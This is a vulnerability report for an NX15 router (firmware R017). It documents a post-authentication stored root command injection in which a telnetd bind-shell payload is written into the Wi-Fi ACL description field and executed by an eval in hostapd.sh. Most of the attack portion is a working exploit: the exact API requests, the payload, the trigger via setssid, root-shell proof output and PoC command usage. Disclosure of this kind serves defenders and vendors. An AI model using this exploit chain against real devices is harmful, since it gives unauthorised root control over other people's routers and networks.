# NX15 R017 `esps.wifi.acl` -> `hostapd.sh` Post-Authentication Stored root RCE

## 1. Conclusion

On NX15 R017, the following `/api/esps` handler:

- `object = esps.wifi.acl`
- `method = add` / `modify`

can write an attacker-controlled payload into `wireless_acl.*.description`. During a later Wi-Fi configuration reload, `/lib/wifi/hostapd.sh` executes that value through `eval`, forming a **confirmed post-authentication stored root RCE**.

- **Endpoint**: `POST /api/esps`
- **Upstream object**: `esps.wifi.acl`
- **Upstream method**: `add` / `modify`
- **Injection field**: `description`
- **Downstream sink**: `/lib/wifi/hostapd.sh`
- **Pure Web trigger**: `object = esps.wifi` / `method = setssid`
- **Trigger method**: modify an existing SSID configuration; in this round, the `hide` field of `5G / SSID1` was changed from `disable` to `enable`
- **Privilege requirement**: post-authentication administrator session
- **Impact**: arbitrary command execution as **root**
- **Verified device**: `192.168.8.1`, NX15 firmware `R017`
- **Status**: **Confirmed / Exploited**

This chain is a typical stored exploit:

> **The attacker first persists the payload into the Wi-Fi ACL configuration, then waits for a normal Wi-Fi configuration rebuild action, after which the system itself executes the payload in a root context.**

Therefore, it has strong stealth and delayed-trigger characteristics.

---

## 2. Root Cause Analysis

Target script:

- `/lib/wifi/hostapd.sh`

### 2.1 `wireless_acl.description` is directly passed to `eval`

The ACL-reading function at the beginning of the file is:

```sh
wireless_acl_getAllitem()
{
    if [ -n "$(uci_get wireless_acl."$1".id)" ] ;then
        eval wireless_acl_id_list"${idx}"="$(uci_get wireless_acl."$1".id)"
    fi
    if [ -n "$(uci_get wireless_acl."$1".description)" ] ;then
        eval wireless_acl_remark_list"${idx}"="$(uci_get wireless_acl."$1".description)"
    fi
    if [ -n "$(uci_get wireless_acl."$1".macaddr)" ] ;then
        eval wireless_acl_mac_list"${idx}"="$(uci_get wireless_acl."$1".macaddr)"
    fi
    ...
}
```

Corresponding line numbers:

- `hostapd.sh:23-40`
- The dangerous sink is located at **`hostapd.sh:28-29`**.

In other words, if an attacker can write a value such as:

```sh
$(/usr/sbin/telnetd -p2482 -l/bin/sh)
```

into `wireless_acl.*.description`, it will be executed directly through shell command-substitution semantics when this function runs.

### 2.2 This is an actual runtime path, not dead code

In the VAP configuration-generation flow in the same file:

```sh
# Get list
idx=1
config_load wireless_acl
config_foreach wireless_acl_getAllitem acl-table
```

Corresponding line numbers:

- `hostapd.sh:983-986`

This shows that whenever hostapd configuration is rebuilt, Wi-Fi is reloaded, or a related wireless configuration is applied, this ACL-reading logic is reached.

### 2.3 `description` itself is not a required hostapd configuration field

This is one reason why the vulnerability is especially straightforward:

- `description` is only ACL remark information.
- It does not need to be emitted later as a core hostapd configuration item.
- However, the script still reads it first and passes it to `eval`.

Therefore, the root cause is not a complex business chain, but:

> **a completely unnecessary `eval` on an untrusted persisted configuration field.**

### 2.4 Upstream `esps.wifi.acl` allows attackers to write `description`

The runtime object signature has been confirmed:

```text
'esps.wifi.acl'
    "add":{"radio":"Array","mac":"String","description":"String","isAllowWifi":"String"}
    "modify":{"id":"Integer","mac":"String","description":"String","radio":"Array","isAllowWifi":"String"}
```

Therefore, an attacker can directly persist a payload through the Web management interface.

---

## 3. Exploit Chain Description

The chain fully closed in this round is:

1. Log in to `/api/login/auth` to obtain an administrator session.
2. Call `esps.wifi.acl.add` to write the payload into `description`.
3. Call `esps.wifi.acl.getlist` to confirm that the payload is stored verbatim.
4. Call `esps.wifi.getssid` to read the current SSID configuration.
5. Call `esps.wifi.setssid` to modify a real Wi-Fi configuration item and force a hostapd configuration rebuild.
6. When `hostapd.sh` reads `wireless_acl.description`, it executes `eval` and starts a root shell.
7. Verify root through the newly opened telnet port.
8. Delete the malicious ACL entry and restore the original Wi-Fi configuration to complete cleanup.

The shortest payload used in this round was:

```sh
$(/usr/sbin/telnetd -p2482 -l/bin/sh)
```

When it reaches the sink, this payload directly starts a root `telnetd`.

---

## 4. Dynamic Verification

### 4.1 Initial state

On the restored test device, first confirm that:

- `esps.wifi.acl.getlist` returns an empty list.
- `hide = disable` for `5G / SSID1`.
- `192.168.8.1:2482` is closed.

### 4.2 Write the stored payload

Request:

```json
[
  {
    "id": 1,
    "object": "esps.wifi.acl",
    "method": "add",
    "param": {
      "radio": ["2.4G", "5G"],
      "mac": "02:11:22:33:44:55",
      "description": "$(/usr/sbin/telnetd -p2482 -l/bin/sh)",
      "isAllowWifi": "false"
    }
  }
]
```

Response:

```json
[{"id":1,"result":{"message":"Success","data":[],"code":0}}]
```

Then read it back:

```json
[{"id":2,"result":{"message":"Success","data":{"count":1,"list":[{"mac":"02:11:22:33:44:55","isAllowWifi":"false","description":"$(/usr/sbin/telnetd -p2482 -l/bin/sh)","id":0,"radio":["2.4G","5G"]}]},"code":0}}]
```

This shows that the payload has been **written verbatim into persistent configuration**.

### 4.3 Pure Web trigger: `esps.wifi.setssid`

First read the current SSID configuration:

```json
[{"id":1,"result":{"message":"Success","data":{"list":[
  {"radio":"2.4G","index":"SSID1","ssid":"H3C_B4D5B0","hide":"disable","auth":"wpa2psk","encrypt":"aes","key":"admin123","keyPeriod":3600,"charset":"utf8","bssid":"","vlan":1,"accessMax":0,"status":"enable","isolation":"disable","curCountryCode":""},
  {"radio":"5G","index":"SSID1","ssid":"H3C_B4D5B0_5G","hide":"disable","auth":"wpa2psk","encrypt":"aes","key":"admin123","keyPeriod":3600,"charset":"utf8","bssid":"","vlan":1,"accessMax":0,"status":"enable","isolation":"disable","curCountryCode":""}
]}}]
```

Then modify only the `hide` field of `5G / SSID1`:

```json
[
  {
    "id": 21,
    "object": "esps.wifi",
    "method": "setssid",
    "param": {
      "list": [
        {
          "radio": "5G",
          "index": "SSID1",
          "status": "enable",
          "ssid": "H3C_B4D5B0_5G",
          "charset": "utf8",
          "auth": "wpa2psk",
          "encrypt": "aes",
          "key": "admin123",
          "keyPeriod": 3600,
          "hide": "enable",
          "isolation": "disable",
          "vlan": 1,
          "accessMax": 0,
          "curCountryCode": "",
          "bssid": ""
        }
      ]
    }
  }
]
```

Response:

```json
[{"id":21,"result":{"message":"Success","data":[],"code":0}}]
```

### 4.4 Root shell proof

After `setssid` returned successfully, `192.168.8.1:2482` opened. Connecting to it directly produced a BusyBox shell, and the following proof was obtained:

```text
uid=0(root) gid=0(root)
Linux NX15 4.4.176-svn22943 #2 Fri Aug 1 14:14:03 CST 2025 mips GNU/Linux
31339 root      1656 S    /usr/sbin/telnetd -p2482 -l/bin/sh
```

This directly proves that:

1. The payload executed on the device.
2. The execution context was **root**.
3. The trigger action came entirely from the Web management interface and did not depend on an existing shell.

---

## 5. Cleanup and Restoration

To avoid affecting later tests, cleanup was performed immediately after successful verification.

### 5.1 Delete the malicious ACL entry

Request:

```json
[
  {
    "id": 9,
    "object": "esps.wifi.acl",
    "method": "delbymac",
    "param": {
      "list": ["02:11:22:33:44:55"]
    }
  }
]
```

Response:

```json
[{"id":9,"result":{"message":"Success","data":[],"code":0}}]
```

### 5.2 Restore `hide = disable` for 5G/SSID1

`esps.wifi.setssid` was called again to restore the previously changed `hide` value from `enable` back to `disable`, and the echoed configuration was read back to confirm successful restoration.

### 5.3 Stop the temporary root telnetd

After killing `/usr/sbin/telnetd -p2482 -l/bin/sh` from the obtained shell, the following was confirmed:

- `192.168.8.1:2482` was closed.
- `esps.wifi.acl.getlist` returned:

```json
[{"id":30,"result":{"message":"Success","data":{"count":0,"list":[]},"code":0}}]
```

Therefore, at the end of this verification round, the device had been restored to the following state:

- The malicious Wi-Fi ACL entry had been deleted.
- The 5G `hide` setting had been restored.
- The temporary shell port had been closed.

---

## 6. Impact Assessment

The security impact of this vulnerability is:

- An attacker with administrator privileges can obtain **root RCE**.
- The payload can be stored first and triggered later, providing delayed execution and stealth.
- The trigger condition can be an ordinary wireless configuration change or a normal operational action such as a system reboot.
- Because the payload is persisted in configuration, even if the attacker temporarily loses the session, they can still wait for an administrator or the system to trigger it later.

It can be classified as:

> **Post-auth stored command injection / stored root RCE**

---

## 7. POC

- `poc/postauth_esps_wifi_acl_hostapd_reload_rce.py`

It is recommended to use the verified pure Web trigger directly:

```bash
python3 poc/postauth_esps_wifi_acl_hostapd_reload_rce.py \
  --preclean-mac \
  --trigger setssid-hide-toggle \
  --cleanup-entry \
  --restore-config \
  --kill-telnetd \
  --port 2482
```

If the current Web management password is not the default `admin123`, add:

```bash
--password '<CURRENT_WEB_PASSWORD>'
```

The default behavior of this PoC is:

1. Log in to the Web management interface.
2. Write a malicious `description` through `esps.wifi.acl.add`.
3. Call `esps.wifi.acl.getlist` to confirm that the payload has been written to persistent storage.
4. Toggle the `hide` field of the specified SSID through `esps.wifi.setssid`, triggering a `hostapd.sh` configuration rebuild.
5. Connect to the temporary root shell port and verify execution.
6. Clean up the malicious ACL entry, restore the SSID configuration, and stop the temporary `telnetd` according to the provided options.

## 8. Conclusion

This vulnerability has been confirmed to be fully exploitable through the pure Web management interface. The attacker writes a payload into `wireless_acl.description`, then triggers the `eval` in `hostapd.sh` through a normal `esps.wifi.setssid` configuration application, ultimately executing arbitrary commands as root.
